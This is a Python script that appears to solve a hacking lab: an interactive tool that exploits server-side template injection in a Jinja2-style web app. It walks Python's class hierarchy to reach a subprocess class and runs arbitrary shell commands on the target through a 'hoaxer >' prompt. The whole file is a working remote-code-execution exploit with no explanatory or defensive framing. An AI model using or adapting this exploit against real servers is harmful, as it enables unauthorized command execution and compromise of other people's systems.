import requests
import os
import html

class Injector():

	def __init__(self, url):
		self.url = url
		self.classInd = 233 
		self.mroInd = -1 
		self.subClasses = None


	def makeRequest(self, param):
		param = "{{" + param + "}}"
		print(param)
		response = requests.get(self.url + param)
		if response.status_code == 500:
			return "Internal server error : 500"
		text = response.text.split("libcurl.so/")[1].split("</h1>")[0]
		return html.unescape(text)	

	def exec(self, arg):
		args = arg.split(" ")
		if(args[0] == '!'):
			try:

				if args[1] == "searchSubClass":
					return self.searchSubClass(args[2])				
				elif args[1] == "showMRO":
					self.showMRO()
				elif args[1] == "showSubClasses":
					self.showSubClasses()
				elif args[1] == "loadSubClass":
					self.loadSubClass(args[2])
				elif args[1] == "loadMRO":
					self.loadMRO(args[2])
				else:
					print("Invalid command !")

			except IndexError:
				print("send proper arguments")
			except Exception as e:
				print(e)
			return ""

		elif(args[0] == '#'):
			try:
				self.run(" ".join(args[1:]))
			except IndexError:
				print("send proper arguments")
			except Exception as e:
				print(e)
			return ""

		result = self.makeRequest(arg)
		print(result)

	def showMRO(self):
		print(self.makeRequest('"".__class__.mro()'))

	def loadMRO(self, mroInd):
		self.mroInd = int(mroInd)
		print(mroInd , " is loaded as mro Index to be used further")

	def showSubClasses(self):
		if self.mroInd == None:
			print("Load mro Index first")
			return

		subClasses = self.getSubClasses()
		for  ind,c in enumerate(subClasses): 
			print(ind, c)

	def loadSubClass(self, classInd):
		if self.mroInd == None:
			print("Load mro Index first")
			return

		subClasses = self.getSubClasses()
		self.classInd = int(classInd)

		print("loaded " + subClasses[self.classInd])

	def getSubClasses(self):
		if self.mroInd == None:
			print("Load mro Index first")
			return

		if self.subClasses != None:
			return self.subClasses			

		result = self.makeRequest('"".__class__.mro()[' + str(self.mroInd) + '].__subclasses__()')
		self.subClasses = result.strip('[]').split(',')
		return self.subClasses

	def searchSubClass(self, subString):
		if self.mroInd == None:
			print("Load mro Index first")
			return
		
		subClasses = self.getSubClasses()
		res = []
		for  ind,c in enumerate(subClasses): 
			if subString.lower() in c.lower(): 
				res.append((ind,c))
		print(res)

	def run(self, cmd):
		if self.mroInd == None:
			print("Load mro Index first")
			return

		if self.classInd == None:
			print("Load subClass first")
			return

		param = '"".__class__.mro()['+ str(self.mroInd) + '].__subclasses__()['+str(self.classInd) + ']' + \
				'("' + cmd + '",shell=True,stdout=-1).communicate()[0]'
		cmdout = self.makeRequest(param)
		print("\n",cmdout)


if __name__=="__main__":

	url = "http://ptl-726bac62-f10108a9.libcurl.so/"
	injector = Injector(url)

	os.system("cls")
	print("By default MRO list index and SubClass index as set as follows: \t\n mroInd = -1 \t\n sub classInd = 233")

	print("\nyou RCE as follows \nhoaxer > # <command>")

	while(True):
		print("\nhoaxer > ", end="")
		cmd = input()
		if cmd.strip() == "":
			continue
		injector.exec(cmd)


